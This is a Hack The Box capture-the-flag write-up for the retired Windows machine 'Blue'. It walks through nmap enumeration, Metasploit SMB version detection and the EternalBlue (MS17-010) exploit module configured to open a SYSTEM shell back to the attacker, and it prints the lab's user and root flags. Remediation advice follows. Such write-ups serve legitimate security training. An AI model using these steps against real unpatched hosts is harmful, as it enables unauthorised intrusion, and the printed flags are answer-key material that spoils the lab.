# HTB - Blue

**Difficulty:** Easy  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Blue is an Easy Windows machine that demonstrates the severity of the EternalBlue exploit (MS17-010). It is one of the most famous vulnerabilities ever discovered, used in real-world ransomware attacks like WannaCry. Root access is obtained directly via Metasploit with no prior foothold needed.

---

## Tools Used

- Nmap
- Metasploit Framework (auxiliary/scanner/smb/smb_version)
- Metasploit Framework (exploit/windows/smb/ms17_010_eternalblue)

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC -p- -Pn --min-rate 5000 <TARGET_IP>
```

**Open ports:**
- 135 → msrpc
- 139 → netbios-ssn
- 445 → microsoft-ds (SMB)
- 49152-49157 → unknown

---

### 2. SMB Version Detection

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_IP>
run
```

Result: target is running **Windows 7 Professional SP1** — a prime candidate for EternalBlue (MS17-010).

---

### 3. Exploitation with Metasploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <TUN0_IP>
run
```

**Result:** shell obtained as `nt authority\system` (highest privileges on Windows).

---

### 4. Flags

```bash
type c:\Users\haris\Desktop\user.txt.txt    # 22120d94558187fd2c9aca0f459761bc 
type c:\Users\Administrator\Desktop\root.txt.txt    # d1fe52bc4bed51eb0ad691fd7195c695 
```

---

## What I Learned

- How EternalBlue (MS17-010) works against unpatched Windows systems
- How to identify vulnerable SMB versions using Metasploit auxiliary modules
- Why keeping Windows systems patched is critical — MS17-010 was patched in March 2017 but still caused massive damage months later with WannaCry

---

## Remediation

- Apply Microsoft patch MS17-010 immediately
- Disable SMBv1 on all Windows systems
- Block port 445 from external access at the firewall
